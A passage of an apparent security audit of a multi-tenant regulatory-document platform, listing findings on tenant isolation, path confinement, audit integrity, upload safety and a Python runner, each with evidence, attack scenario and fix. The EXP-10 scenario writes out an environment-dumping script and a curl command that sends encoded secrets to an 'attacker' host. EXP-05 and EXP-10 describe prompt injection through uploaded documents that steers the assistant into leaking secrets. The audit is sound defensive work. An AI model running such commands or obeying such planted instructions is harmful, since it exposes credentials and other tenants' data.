- server/routes/chat/upload.ts refuses byte-less uploads outright (:73-85) and checksums the raw bytes rather than extracted text (:398), with both prior bugs written up at the call site — including the excellent note that the old sha256(extractedText) fallback made the checksum a platform-wide constant so 'four different documents became one source'. The tenant-scoped storage prefix at :147-157 and the honest 'unscoped/' namespace for org-less uploads are also right.
- server/services/compute/scriptWorker.ts:60-63 spreads output_path LAST in the worker input JSON (`JSON.stringify({ ...input, output_path: outputPath })`), so a payload field can never redirect where the Python runtime writes — a small detail that is exactly the kind of thing that goes wrong.
- The eCTD assemble path cleans up after itself correctly: server/services/ectd/assemble-from-core.ts:96-99 and :166-170 guard the window between mkdtemp and the caller receiving the cleanup handle, with the leak it prevents spelled out ('otherwise a failed assemble leaks its staged temp dir because the caller never gets cleanup()').

#### `P0` EXP-01 — Any authenticated user can download any tenant's generated regulatory document by filename from the shared generated_documents/ directory; same-title generations silently overwrite each other

`server/routes/concept2cure.ts:12355` · blocks **G1** · ~days · tenant-isolation

**Evidence.** Serve side, concept2cure.ts:12355-12483 — `router.get('/documents/download/:filename', ...)`; the only authorization is `const canExport = ['admin','approver','reviewer','author','user'].includes(exportRole)` (12358-12360), then `const docDir = resolve(process.cwd(), 'generated_documents'); const filePath = join(docDir, safe);` (12375-12376) and `createReadStream(filePath).pipe(res)` (12483). The file is located purely by name — no organization_id is consulted anywhere in the handler. Mounted auth-gated for ALL orgs at server/bootstrap/register-concept2cure-routes.ts:11 (`app.use('/api/concept2cure', authenticateToken, concept2cureRoutes)`).
Write side, server/services/tools/index.ts:1007-1012 — `const outDir = path.resolve(process.cwd(), 'generated_documents'); const docxPath = path.join(outDir, result.filename); const jsonPath = docxPath.replace(/\.docx$/, '.source.json'); await fs.writeFile(docxPath, result.buffer); await fs.writeFile(jsonPath, JSON.stringify(result.source, null, 2));` — no org segment, no uniqueness suffix.
Filename is fully predictable, server/services/docx/docxFactory.ts:653-656 — `const safeName = metadata.title.replace(/[^a-zA-Z0-9_\- ]/g,'').replace(/\s+/g,'_'); const dateStr = (metadata.date || new Date()...).replace(/-/g,''); const filename = `${safeName}_${metadata.submissionType}_${dateStr}.docx`;`
saveGeneratedDocx (server/services/docxGenerator.ts:49-56) writes to the same flat dir.

**Failure scenario.** Org 1 user runs the `documents.generate_docx` tool with title "Clinical Overview" and submissionType "IND" on 2026-07-28. The server writes generated_documents/Clinical_Overview_IND_20260728.docx plus Clinical_Overview_IND_20260728.source.json (full source sections). Org 2 user, holding only their own valid JWT and the default 'user' role, issues GET /api/concept2cure/documents/download/Clinical_Overview_IND_20260728.docx and receives org 1's complete regulatory document; a second GET for the .source.json returns its structured source. Separately, if org 2 generates a document with the same title/type on the same day, fs.writeFile overwrites org 1's file in place with no version — org 1's next download returns org 2's content while the provenance event and submission snapshot written at concept2cure.ts:12406-12466 still attribute it to org 1's artifact.

**Fix.** Key stored documents by (organizationId, opaque id): write to generated_documents/org-{orgId}/{uuid}/{filename} and record the row in a table with organization_id. Change the download route to look the document up by an opaque id filtered on the caller's org and resolve the path from that row; never accept a client-supplied filename as the lookup key. Backfill: move existing files under an org prefix using the provenance rows, and treat unattributable files as inaccessible.

#### `P0` EXP-02 — POST /api/mdx/imports reads an arbitrary server filesystem path and inflates every ZIP entry into memory with no size, entry-count, or compression-ratio cap

`server/routes/mdx-imports.ts:46` · blocks **G1** · ~days · resource-exhaustion

**Evidence.** server/routes/mdx-imports.ts:46-50 — `const createBody = z.object({ sourcePath: z.string().min(1).max(2000), ... })`; :82 — `const detected = await detectArchive(p.sourcePath);` executed synchronously inside the request handler. There is no path allowlist, no confinement to an org directory, and no check that the path relates to the caller's tenant.
server/services/legacy-importer/detector.ts:170-177 — `const stat = await fs.stat(archivePath); ... const buffer = await fs.readFile(archivePath);`
:184 — `zip = await JSZip.loadAsync(buffer);`
:192 — `const entries = Object.values(zip.files).filter((f) => !f.dir);` then every branch calls fileEntry(), which at :322 does `const buf = await ent.async('nodebuffer');` for EVERY entry. No limit is applied to entry count, uncompressed size, or the compressed:uncompressed ratio anywhere in the module.
Mounted at server/bootstrap/register-inline-routes.ts:1110 — `app.use('/api/mdx', mdxImportsRoutes);`. The same unconfined path also reaches detectArchive via the AnA tool handler at server/services/ana/AnaToolExecutor.ts:13811-13836 (`start_legacy_import`, `source_path` straight from model args).

**Failure scenario.** An authenticated user of org 1 POSTs {"sourcePath":"storage/vault/2/PRJ-9/versions/<uuid>/IVDR_Pack_v3.zip"} to /api/mdx/imports. detectArchive reads org 2's vault ZIP and the handler persists, then returns, the relative path, filename, byte size and SHA-256 of every file inside it (mdx-imports.ts:88-104) — a full contents listing of another tenant's submission package. Separately, the same user POSTs a path to a 40 KB nested-deflate zip bomb they uploaded moments earlier through any of the ZIP-accepting upload routes: JSZip inflates each entry into a Node Buffer with no cap, RSS climbs past the container memory limit, and the single API process is OOM-killed — a full multi-tenant outage from one request.

**Fix.** Resolve sourcePath through a tenant-scoped upload record (org id + stored blob ref) instead of accepting a raw path; if a raw path must be supported, confine it with the existing resolveWithinDocumentWorkspace-style guard plus an org-directory prefix check. In detectArchive, enforce hard caps before inflating: max entry count, max total uncompressed bytes, max per-entry uncompressed bytes, and a max compression ratio, aborting with a structured finding when any is exceeded. Move detection off the request thread.

#### `P0` EXP-03 — Governed export records a hash of the client-posted JSON, never of the exported bytes, and writes it to an audit table with no tamper-evidence

`server/services/compute/artifactWriteback.ts:36` · blocks **G2** · ~weeks · audit-integrity

**Evidence.** server/services/compute/artifactWriteback.ts:36 — `const contentHash = crypto.createHash('sha256').update(input.content).digest('hex');` where `input.content` is the caller's `contentForArtifact`. In server/services/export/governedExportConsequence.ts:100 that value is `input.contentForArtifact`, which the routes set to `JSON.stringify(content)` — the TipTap editor JSON the CLIENT posted (server/routes/cerv2-export-routes.ts:310, 376, 440). The actual delivered file, `input.binaryOutput`, is used only at governedExportConsequence.ts:135 — `data: input.binaryOutput.toString('base64')` — and is never hashed, stored, or referenced by the artifact, provenance event, or audit row.
The concept2cure download path is worse: server/routes/concept2cure.ts:12387-12391 — `const exportHash = crypto.createHash('sha256').update(`${safe}:${fileStat.size}:${fileStat.mtimeMs}`).digest('hex');` — a hash of filename, size and mtime, which is then written as both `contentHash` and `exportHash` on the submission snapshot (12446-12447).
The audit table has no chain: migrations/0000_sweet_joseph.sql:4997-5021 `CREATE TABLE "regulatory_audit_logs"` has no previous_hash/record_hash/chain_hash column, while the repo demonstrably knows the pattern — proof_audit_logs at 4567-4568 has `"previous_hash" text, "hash_chain" text NOT NULL`.

**Failure scenario.** A user exports a CER as PDF via POST /api/cerv2/export/pdf. The response carries artifact_id, audit_ref and the base64 PDF, and the DB records content_hash = sha256 of the editor JSON. Six months later a notified body asks the sponsor to prove that the PDF in their file is the artifact audit_1753812345_ab12cd34 describes. Nothing can: the recorded hash is over a different object (the JSON), so re-hashing the PDF produces a value that appears nowhere; two different renderer versions of the same JSON both satisfy the record; and because regulatory_audit_logs has no chain column, an UPDATE against the audit row leaves no detectable trace. The same request path also emits `governed: true` (governedExportConsequence.ts:122) to the client while none of this holds.

**Fix.** Hash the bytes actually delivered: compute sha256(binaryOutput) in createGovernedExportConsequence, persist it on the artifact/version row and in the provenance + audit metadata, and return it to the client so the recipient can verify. Store or reference the binary itself (vault ref) rather than only streaming it. Add previous_hash/record_hash chaining to regulatory_audit_logs mirroring proof_audit_logs, and wire the existing auditChainIntegritySweep job to verify it.

#### `P0` EXP-04 — The production human-review gate on governed exports is a boolean the client sets in its own request body; the response then asserts the export was human-reviewed

`server/routes/cerv2-export-routes.ts:120` · blocks **G1** · ~weeks · regulatory-governance

**Evidence.** server/routes/cerv2-export-routes.ts:120-126 — `const exportGovernanceSchema = z.object({ aiGenerated: z.boolean().default(true), humanReviewApproved: z.boolean().default(false), reviewerName: z.string()..., reviewerRole: ..., reviewTimestamp: z.string().datetime().optional() });`
:149 — `const parsed = exportGovernanceSchema.safeParse(req.body?.governance ?? {});` — every field comes from the request body.
:156-162 — `if (shouldEnforceExportReviewGate() && !governance.humanReviewApproved) { res.status(403).json({ error: 'HUMAN_REVIEW_REQUIRED' ... }) }` — the gate's sole input is that client boolean.
:134-145 `applyGovernanceHeaders` then sets `X-Concept2Cure-Human-Review-Approved: true`, `X-Concept2Cure-Governance-Persistence: governed`, and `X-Concept2Cure-Reviewer: <client-supplied name>`.
No reviewer identity check against req.user, no re-authentication, no signature-manifest lookup — and note the repo has a real Part 11 e-signature flow it does not use here (server/routes/submissions.ts:1281-1285 requires a signatureActionId from POST /api/c2c/actions/sign with re-auth and separation of duties).

**Failure scenario.** In production (shouldEnforceExportReviewGate() returns true when NODE_ENV==='production', line 131) an author with the 'editor' role POSTs to /api/cerv2/export/pdf with body {"docType":"cerv2_cer","projectId":7,"content":{...},"governance":{"humanReviewApproved":true,"reviewerName":"Dr. A. Reviewer","reviewerRole":"Notified Body Liaison","reviewTimestamp":"2026-07-28T09:00:00Z"}}. The 403 gate passes, the PDF is produced, the response headers declare the document human-review-approved by a named reviewer who never opened it, and an is_gxp_relevant=TRUE EXPORT_GENERATED row is written (artifactWriteback.ts:117-138). Nothing in the request required a second human, a second credential, or a stored review record.

**Fix.** Derive review state server-side: require the artifact to carry an approved review record (reviewer user id, timestamp, and a Part 11 signature action id) before the export route will run, exactly as submissions.ts:1281 does for freeze/dispatch. Reject any client-supplied reviewerName/reviewTimestamp; populate the headers from the stored record. Make the gate default-on regardless of NODE_ENV for any docType that claims regulatory placement.

#### `P1` EXP-05 — Five AnA document tools read a model-chosen filesystem path with no workspace confinement; the guard written to close exactly this class is applied to 1 of 6 call sites

`server/services/ana/AnaToolExecutor.ts:6919` · blocks **G1** · ~hours · path-confinement

**Evidence.** The guard exists and its header names the exact arguments it was built for — server/services/ana/document-workspace.ts:6-8: "Several AnA tools take a filesystem path straight out of the model's tool arguments — `input_docx_path`, `output_pdf_path`, `package_path` — and hand it to `fs.readFile`". Lines 53-69 document the resolve-base mismatch that #1186 fixed and line 119 stresses "Callers must use this value".
Applied at exactly one site: AnaToolExecutor.ts:6743-6747 (`convert_docx_to_pdf`) — `safeInputDocxPath = assertWithinDocumentWorkspace(inputDocxPath, 'input_docx_path');`
Unguarded raw reads of the same model-supplied argument:
  :6919 `const sourceBuf = await fs.readFile(inputDocxPath);`  (insert_document_content, arg read at :6886)
  :7004 `const sourceBuf = await fs.readFile(inputDocxPath);`  (surgical_docx_xml_edit, arg at :6975)
  :7127 `const sourceBuf = await fs.readFile(inputDocxPath);`  (insert_clause_template, arg at :7069)
  :7194 `const buf = await fs.readFile(inputDocxPath);`         (validate_docx, arg at :7182)
  :7245 `const buf = await fs.readFile(inputDocxPath);`         (verify_docx_against_source, arg at :7221)
The last one turns the read into an oracle: :7247 calls `extractDocumentText(buf, DOCX_MIME, path.basename(inputDocxPath))`, and server/services/ocr/extractDocumentText.ts:49,65-67 takes the plain-utf8 branch whenever the BASENAME matches `/\.(txt|md|csv|json|log)$/i` regardless of the passed mime. The handler then returns `docCharCount` and `missingRequiredStrings` (:7272-7275) for model-supplied `required_strings`.

**Failure scenario.** An uploaded protocol contains injected text instructing the assistant to "verify the config". The model calls verify_docx_against_source with input_docx_path="drizzle.config.ts"... which returns method 'none'; it retries with input_docx_path="package-lock.json" and required_strings=["sk-","postgres://"]. Because the basename ends in .json, extractDocumentText returns the raw file text, and the tool result reports the character count and precisely which of the probe strings were present — a working content oracle over any file the API user can read, driven one required_strings batch at a time and fed straight back into the conversation. With input_docx_path="generated_documents/Clinical_Overview_IND_20260728.docx" (a predictable name per EXP-01), insert_document_content reads another tenant's document, edits it, and persists the result into the caller's own tmp/docbuilder workspace.

**Fix.** Apply assertWithinDocumentWorkspace to input_docx_path in all five handlers and use the returned resolved path, matching convert_docx_to_pdf. Add a CI gate asserting that every `fs.readFile(` whose argument derives from `input.` inside AnaToolExecutor.ts is preceded by an assertWithinDocumentWorkspace call, so the next tool added does not reopen it. Separately, stop letting extractDocumentText's filename heuristic override an explicitly-passed mime.

#### `P1` EXP-06 — document-understanding endpoints read any file under uploads/, storage/, exports/, generated_documents/, csrs/ and ectd/ by request-supplied path with no tenant check, and return its text

`server/routes/document-understanding.ts:572` · blocks **G1** · ~days · tenant-isolation

**Evidence.** server/routes/document-understanding.ts:571-590 (POST /extract-tables) — `const { content, filePath } = req.body; ... const ALLOWED_ROOTS = [path.resolve('uploads'), path.resolve('exports'), path.resolve('generated_documents'), path.resolve('csrs'), path.resolve('ectd'), path.resolve('storage')]; const fullPath = path.resolve(filePath); if (!ALLOWED_ROOTS.some(root => fullPath.startsWith(root))) { return res.status(403)... } ... text = fs.readFileSync(fullPath, 'utf-8');` The identical block is repeated at :614-625 (POST /extract-form-fields) and :452-470 (the analyze route). No organization_id is consulted in any of the three.
The containment test is also a bare prefix compare with no path separator, so `<cwd>/uploads-backup/x` satisfies `startsWith(<cwd>/uploads)`.
Mounted without route-level auth at server/bootstrap/register-clinical-intel-routes.ts:100-104 (covered only by the global /api boundary, i.e. any authenticated user of any org).
`storage/` is the vault root — server/services/vaultService.ts:26 `const VAULT_ROOT = path.resolve(process.cwd(), 'storage', 'vault');` — and `uploads/org-{id}/` is the chat-upload tenant store (server/routes/chat/upload.ts:156-157).

**Failure scenario.** An authenticated user of org 1 POSTs {"filePath":"storage/vault/2/PRJ-9/versions/2f1c.../IVDR_Pack_v3_manifest.json"} to /api/document-understanding/extract-tables. path.resolve puts it under the storage root, the 403 check passes, fs.readFileSync returns org 2's manifest, and the extracted content comes back in the JSON response. The same request shape reaches org 2's chat uploads at uploads/org-2/<fileId> and any eCTD staging output under ectd/.

**Fix.** Remove the raw-path parameter. Accept a document id, resolve it through a tenant-scoped DB lookup (organization_id = caller's org), and read only the storage path on that row. If a path parameter must remain for internal callers, gate it behind a service credential and require both a workspace-root containment check with a path.sep boundary and an org-prefix match.

#### `P1` EXP-07 — The canonical PDF converter's determinism routine rewrites PDF bytes without repairing the xref table, is tested only against a synthetic fragment, and has no production callers

`server/services/pdf-converter.ts:213` · blocks **G2** · ~weeks · determinism

**Evidence.** server/services/pdf-converter.ts:213-235 `makeDeterministic` operates on `pdf.toString('binary')` and performs variable-length substitutions: `/CreationDate (D:20260728093000+00'00')` → `/CreationDate (D:19700101000000Z)` (:216-220), and `/Producer (LibreOffice 7.5.4.2 40(Build:2))` → `/Producer (Concept2Cure RI canonical)` (:226-227). Every one of these changes the file's byte length ahead of the cross-reference table, and nothing in the function recomputes object offsets or the trailing `startxref` value. The docblock at :16-20 nonetheless states "the same DOCX input always yields byte-identical PDF output. This is what makes the SHA-256 of the PDF a stable artifact ID for the audit chain", and :27-30 cites 21 CFR Part 11 §11.10(c).
The tests never exercise a real PDF — server/services/__tests__/pdf-converter.test.ts:4-5 comments "We don't need a valid PDF for these tests — just bytes that match the regexes", and buildSyntheticPdf (:20-32) emits a five-line fragment. No test reopens or re-parses the output.
No production caller: grepping the repo for `convertDocxToPdf` outside this module yields only server/services/pdfConversionService.d.ts (a different, non-existent module) and the test file.
The CI gate repeats the unimplemented claim — scripts/ci/check-pdf-runtime-canonicality.mjs:5-9 "so its output is deterministic and its hash is bound to the audit chain" — while listing 30 allowlisted non-canonical PDF entry points (:33-80) and scanning only `server/` (:86).

**Failure scenario.** Enable the converter for eCTD leaf production. LibreOffice emits a PDF whose /Info dictionary object precedes the xref table. makeDeterministic shortens the Producer string by 12 bytes and lengthens CreationDate by 2; every xref entry for objects after that point, and the startxref offset, now point 10 bytes off. A strict consumer — the PDF/A detection in server/services/ectd/pdfa-detect.ts, an agency validator, or pdf-lib's parser — reports a damaged cross-reference table or silently repairs it into different bytes, so the SHA-256 the audit chain was supposed to pin is neither stable nor over a valid document. Determinism also fails silently for any LibreOffice build that writes the Info dictionary into a compressed object stream, where none of the four regexes match at all.

**Fix.** Do not hand-edit PDF bytes. Set the metadata deterministically at generation time (LibreOffice `-env:UserInstallation` with a fixed profile plus PDF export filter options for producer/date), or re-serialise through a PDF library that rewrites the xref (pdf-lib save with a fixed /ID). Replace the synthetic tests with a golden test that runs a real DOCX through the converter twice and asserts (a) byte equality and (b) that the output re-parses cleanly under pdf-lib. Correct or delete the Part 11 §11.10(c) and "hash bound to the audit chain" claims until they are true.

#### `P1` EXP-08 — POST /api/ind-pdf/convert/docx-to-pdf dynamically imports a module that does not exist, so the endpoint can only ever return 500

`server/routes/ind-pdf.ts:769` · blocks **G1** · ~hours · dead-feature

**Evidence.** server/routes/ind-pdf.ts:768-770 — `const mod = (await import('../services/pdfConversionService.js' as any)) as any; const convertDocxToPdf = mod.convertDocxToPdf; const pdfBuffer = await convertDocxToPdf(req.file.buffer);`
The only file with that basename in the repo is a type declaration: `server/services/pdfConversionService.d.ts` (580 bytes). `find . -name "pdfConversionService*"` outside node_modules returns that one path — there is no .ts, .js, or built artifact, so the dynamic import rejects on every request.
The .d.ts header itself asserts a behaviour the route does not implement: "when it is absent the dynamic import rejects and the route returns a graceful 'conversion unavailable' response". The actual catch (ind-pdf.ts:782-787) returns `res.status(500).json({ error: 'DOCX-to-PDF conversion failed', message: 'An unexpected error occurred' })`.
The route is live — mounted at server/bootstrap/register-document-routes.ts:174-175.

**Failure scenario.** A user uploads a 12 MB DOCX to POST /api/ind-pdf/convert/docx-to-pdf. multer buffers it, the dynamic import throws ERR_MODULE_NOT_FOUND, and the user receives HTTP 500 "An unexpected error occurred" with no indication the feature was never installed. This happens on 100% of requests, in every environment, and the response gives support no way to distinguish it from a transient failure.

**Fix.** Either implement pdfConversionService (or point the import at the existing server/services/pdf-converter.ts convertDocxToPdf) or delete the route. If the capability is genuinely optional, probe for it at boot and respond 501/503 with an explicit `CONVERSION_UNAVAILABLE` code and an operator-actionable message, matching what the .d.ts already promises.

#### `P1` EXP-09 — The chat upload path never fail-closes on an unavailable virus scanner, even in production, because it bypasses the middleware that implements that policy

`server/routes/chat/upload.ts:136` · blocks **G2** · ~hours · fail-open

**Evidence.** server/routes/chat/upload.ts:23-24 imports the low-level primitives directly (`verifyFileSignature`, `scanBuffer as scanForViruses`) rather than the composed gate. At :123-144: `const scan = await scanForViruses(fileBuffer); if (!scan.clean) { ...reject... } if (!scan.scanned) { logger.warn('Virus scan bypassed', { fileName, reason: scan.reason }); }` — the `!scan.scanned` branch logs and falls through unconditionally.
The production fail-closed policy exists only in the middleware this route does not use — server/middleware/uploadSafety.ts:151-168: `if (!scan.scanned) { if (isProduction()) { ... throw new UploadSafetyError(503, 'FILE_SCAN_UNAVAILABLE', ...) } ... }`.
The underlying scanner is fail-open by design: server/utils/virusScan.ts:81-87 returns `{scanned:false, clean:true, reason:'clamav_not_configured'}` when CLAMAV_HOST is unset, and :111/:116/:121 return `clamav_unreachable` on connect error/timeout.
The bytes are then persisted (upload.ts:163-174), text-extracted (:197-210) and embedded into lumen_data_atoms (:331-344).

**Failure scenario.** clamd is restarted during a production deploy, or CLAMAV_HOST is omitted from the new environment. Every file posted to /api/chat/upload during that window — a macro-bearing .docx, a weaponised PDF — passes the magic-byte check (it is a genuine DOCX/PDF), is written to uploads/org-N/file_..., gets a cre_evidence_sources identity with ingestionStatus:'ingested', and is offered back to other users of the tenant as project evidence. The only trace is one warn line per file; the securityHealth EICAR probe (server/services/securityHealth.ts:231) will report the scanner down but blocks nothing.

**Fix.** Replace the inline verifyFileSignature + scanBuffer pair in chat/upload.ts with `assertUploadSafe(fileBuffer, mimeType, fileName)` and the standard UploadSafetyError → res.status(err.status).json(err.body) translation used by the seven other adoption sites. Add a CI gate forbidding direct imports of utils/virusScan outside middleware/uploadSafety.ts and services/securityHealth.ts.

#### `P1` EXP-10 — run_python_script executes model-authored Python in-process as the API user with the server's full environment; the advertised container isolation does not exist

`workers/artifact-compute/python-script-runtime.py:156` · blocks **G1** · ~weeks · sandbox-escape

**Evidence.** workers/artifact-compute/python-script-runtime.py:150-159 — `script_globals = {"__name__": "__main__", "__builtins__": builtins, ...}` then `compiled = compile(code, "<ana-script>", "exec"); exec(compiled, script_globals)`. The full builtins module is exposed; os, subprocess and ctypes are all importable.
The only egress control is monkeypatching three symbols on the socket module — :64-83 `_install_network_guard` sets `socket.socket = _deny`, `socket.create_connection = _deny`, `socket.create_server = _deny`. `os.system`, `subprocess.run`, and `importlib.reload(socket)` all bypass it, yet :177 still reports `"network": "disabled"` back to the caller.
The parent passes the whole server environment: server/services/compute/scriptWorker.ts:66-73 — `spawn('python3', [runtimeScript, inputPath], { cwd: workdir, env: { ...process.env, ARTIFACT_COMPUTE_NO_NETWORK: '1', ARTIFACT_COMPUTE_WORKDIR: workdir }, stdio: 'pipe' })`.
stdout is returned to the model: server/services/ana/AnaToolExecutor.ts:6851 `stdout: truncateForModel(result.stdout)` (4000-char cap at :6803).
The claimed sandbox is a 48-line type guard, not a runtime: workers/artifact-compute/runner.ts is only validateEnvelope(), and grepping Dockerfile.optimized, docker-compose*.yml, helm/ and terraform/ for "artifact-compute" returns nothing — no isolated service is deployed. The runtime's own docstring (:28-32) concedes it is "defence-in-depth, not the only boundary. Production runs inside a locked-down container".

**Failure scenario.** Content in an uploaded document instructs the assistant to run a diagnostic script. The model calls run_python_script with code `import os; print({k:v for k,v in os.environ.items()})`. The subprocess inherits DATABASE_URL, the JWT signing secret, and the Anthropic/OpenAI keys, prints them, and the first 4000 characters come back through the tool result into the conversation transcript. A second call with `import os; os.system("curl -s https://attacker/?d=$(cat /proc/self/environ | base64 -w0)")` exfiltrates the same values out-of-band while the tool response still reports network: "disabled". Possession of DATABASE_URL is a complete cross-tenant compromise.

**Fix.** Stop passing process.env: build an explicit minimal env for the spawn (PATH, HOME, PYTHONPATH, ARTIFACT_COMPUTE_*) and nothing else. Run the interpreter under a separate unprivileged uid with a read-only root and a tmpfs workdir, or in the container the docstring already assumes — and fail closed at boot if that runtime is unavailable rather than silently degrading to in-process exec. Enforce egress with network namespace/seccomp, not by monkeypatching socket, and stop reporting network:"disabled" unless a namespace-level control is actually in force.

#### `P2` EXP-11 — The services/storage vault is org-blind by construction and its two AI-action consumers never check tenancy; the S3 provider also loses files past 1000 objects

`server/services/storage/local-provider.ts:166` · blocks **G2** · ~days · tenant-isolation

**Evidence.** server/services/storage/local-provider.ts:166-179 `findVersionDir` iterates EVERY org directory under storage/vault looking for the version id: `const orgs = fs.readdirSync(VAULT_ROOT...); for (const org of orgs) { ... for (const proj of projects) { const verPath = path.join(orgPath, proj.name, 'versions', vaultVersionId); if (fs.existsSync(verPath)) return verPath; } }`. `get(vaultVersionId)` (:77-96) takes no orgId parameter at all. server/services/storage/s3-provider.ts:275-303 `getMeta` does the equivalent with `ListObjectsV2Command({ Bucket, Prefix: '', MaxKeys: 1000 })`.
Neither consumer scopes the result: server/services/ai-actions/handlers/ocr-extract-text.ts:67-68 `const storage = getStorageProvider(); const file = await storage.get(vaultVersionId);` — `ctx.user.organizationId` is used only to stamp provenance (:60), never compared to the file's stored orgId. Identical at server/services/ai-actions/handlers/extract-template-from-upload.ts:47-48.
The tree is shared with the real writer: server/services/vaultService.ts:26 uses the same VAULT_ROOT and :124-161 writes the same `_meta.json` shape for IVDR pack PDFs/DOCX/ZIP.
The correct pattern exists elsewhere — server/routes/ivdr-binder-routes.ts:922-932 resolves the version id from a row already filtered `WHERE id = $1 AND organization_id = $2`.
Pagination bug: s3-provider.ts:279-286 never follows ContinuationToken, so getMeta only ever sees the first 1000 keys of the bucket; list() at :196-199 has the same defect.

**Failure scenario.** A vaultVersionId belonging to org 2 becomes visible to an org 1 user — they appear in /api/ivdr responses, in worker logs (vaultService.ts:156-158 logs the id at info level), and in DB rows. The org 1 user invokes the ocr_extract_text AI action with that id; local-provider.get scans every org directory, finds org 2's IVDR technical documentation pack, and returns its full OCR'd text as the action result. On S3, once the bucket exceeds 1000 objects the same getMeta silently returns null for most legitimate version ids, so a tenant's own downloads start reporting FILE_NOT_FOUND for files that exist.

**Fix.** Add orgId to the IStorageProvider get/delete/getSignedUrl signatures and enforce it in both providers (local: build the path from orgId rather than scanning; S3: key the lookup off a DB index of vaultVersionId → orgId/projectId). Have both AI-action handlers pass ctx.user.organizationId and reject on mismatch. Paginate ListObjectsV2 with ContinuationToken in getMeta and list. Consider deleting services/storage entirely and standardising on vaultService, since the two are parallel implementations over one directory.

#### `P2` EXP-12 — The governed-export and runtime-canonicality CI gates are substring greps that pass unchanged with the integrity defects above fully present

`scripts/ci/check-governed-export-consequence-shape.mjs:10` · blocks **G2** · ~days · ci-gate-quality

**Evidence.** scripts/ci/check-governed-export-consequence-shape.mjs:10-26 asserts only that the literal strings 'governed: true', 'artifact_id:', 'provenance_ref:', 'audit_ref:', "encoding: 'base64'", 'assertValidGovernedExportInput' appear in governedExportConsequence.ts, and :29-45 that two backendRoute literals appear in the route files. Nothing asserts the exported bytes are hashed, that review state is server-derived, or that the audit row is chained.
scripts/ci/check-governed-export-routes.mjs:10-33 is the same pattern (`mustContain` string lists); its only behavioural rule is a forbidden-token scan for 'archive.pipe(res)' inside the POST /zip section (:62-70).
scripts/ci/check-pdf-runtime-canonicality.mjs:86 `const SCAN_ROOTS = [path.join(repoRoot, 'server')];` — client/, scripts/, services/ and workers/ are invisible to the gate — and its header (:5-9) asserts an audit-chain binding no code implements.
scripts/ci/check-docx-runtime-canonicality.mjs:26-71 allowlists 13 JS and 21 Python files against 3 nominally-approved runtimes; :141-157 explicitly downgrades the `new Document(` scan to advisory ("We only hard-fail on this if the file also has a docx import").
All three are wired into CI (.github/workflows/ci.yml:164, 167, 176), so they consume a green check without testing the property they are named for.

**Failure scenario.** An engineer implements EXP-03's fix incorrectly — hashes the JSON instead of the bytes — or a reviewer reintroduces the client-supplied humanReviewApproved boolean. Both CI gates pass, because every required substring is still present in both files, and the PR merges with a green 'governed export contract check passed'. The gate has taught the team that this area is covered when it is not.

**Fix.** Convert these to behavioural tests: a supertest that exports a document and asserts sha256(returned bytes) equals the persisted export hash; a test that a request with governance.humanReviewApproved=true and no stored approval is rejected; a test that mutating an audit row breaks the chain check. Keep the greps only as a cheap anti-deletion tripwire, and widen check-pdf-runtime-canonicality's SCAN_ROOTS beyond server/.

#### `P2` EXP-13 — Six multer sites accept uploads with no fileFilter, one with no size limit at all buffering unbounded bytes into the API process for a feature that is disabled

`server/src/routes/stability.router.ts:46` · blocks **G2** · ~days · resource-exhaustion

**Evidence.** server/src/routes/stability.router.ts:46 — `const upload = multer({ storage: multer.memoryStorage() });` — no fileFilter AND no limits. Busboy's defaults are unbounded: node_modules/busboy/lib/types/multipart.js:254-259 `fileSizeLimit = (limits && typeof limits.fileSize === 'number' ? limits.fileSize : Infinity)` and `filesLimit = ... : Infinity`. The in-handler middleware validateUploadedFile (:85-121) checks MIME and magic bytes but never size. Used at three endpoints: :824, :2101, :2748.
The :824 endpoint is also dead: after buffering the file it returns `{ message: 'CSV import feature temporarily unavailable', imported: 0 }` (:848-852) — and it does `await client.query('BEGIN')` at :830 then returns without COMMIT or ROLLBACK, releasing a connection with an open transaction back to the pool at :859.
No fileFilter at five further sites: server/services/DocumentDataCenterService.ts:187-201 (100MB, disk), server/routes/knowledge-base.ts:53 (100MB, memory), server/routes/onboarding-proposals.ts:64-67, server/routes/ind-templates.ts:14 (25MB), server/routes/concept2cure.ts:780-783 (50MB).
Adoption of the shared allowlist is one file: `makeUploadFileFilter` from server/middleware/uploadAllowlist.ts is imported by exactly one non-test module, server/routes/chat.ts:14/59, against ~29 multer configurations in server/.

**Failure scenario.** An authenticated user POSTs a 4 GB multipart body to /api/stability/studies/1/results/import. multer.memoryStorage concatenates it into a single Node Buffer with no cap; RSS exceeds the container limit and the API process is OOM-killed, taking every tenant offline. Even when it survives, the request has already opened a Postgres transaction it never closes and returns that connection to the shared pool, so a later unrelated query on the same pooled client executes inside the leaked transaction. The user's reward for all of it is 'CSV import feature temporarily unavailable'.

**Fix.** Give stability.router.ts explicit `limits: { fileSize, files: 1 }` and delete or complete the disabled CSV import (and add the missing ROLLBACK on the early-return path). Replace the five ad-hoc/absent fileFilters with makeUploadFileFilter(), which already encodes the blocked-extension policy, and add a CI gate asserting every `multer({` config in server/ specifies both `limits.fileSize` and a fileFilter.

#### `P2` EXP-14 — Part 11 provenance and GxP-flagged audit rows for governed exports are written with a hardcoded client IP and a hardcoded user role

`server/services/compute/artifactWriteback.ts:95` · blocks **G3** · ~days · audit-integrity

**Evidence.** server/services/compute/artifactWriteback.ts:91-95 — the provenance INSERT ends `... backend_service, ip_address, created_at, updated_at) VALUES ($1,$2,$3,$4,'generation','artifact_compute_writeback',$5,$6,NULL,$7,$8,$9,$10,'127.0.0.1',$11,$11)` — the IP is a string literal in the SQL, not a bound parameter.
:117-122 — the regulatory_audit_logs INSERT is `... VALUES ($1,$2,'artifact',$3,$4,'data-change',NULL,$5,$6,$7,'system','127.0.0.1',TRUE,$8,$9,$8,$8)` — user_role is the literal 'system' and ip_address is again '127.0.0.1', on a row explicitly marked `is_gxp_relevant = TRUE`.
The column is declared NOT NULL (migrations/0000_sweet_joseph.sql:5012 `"ip_address" text NOT NULL`), and user_agent/session_id (5013-5014) are left unpopulated entirely.
The platform has the correct helper and uses it elsewhere: server/routes/concept2cure.ts:12419 writes `ipAddress: getClientIp(req)` on its provenance event. This path simply does not thread the request through.

**Failure scenario.** An inspector reviewing the audit trail for an EXPORT_GENERATED event asks who exported the CER and from where. Every governed export in the system reports the same origin, 127.0.0.1, and the same role, 'system', regardless of which user in which office performed it, with user_agent and session_id null. The record is not merely incomplete — it asserts a specific origin that is false for every row, which is worse for a Part 11 review than a null would have been.

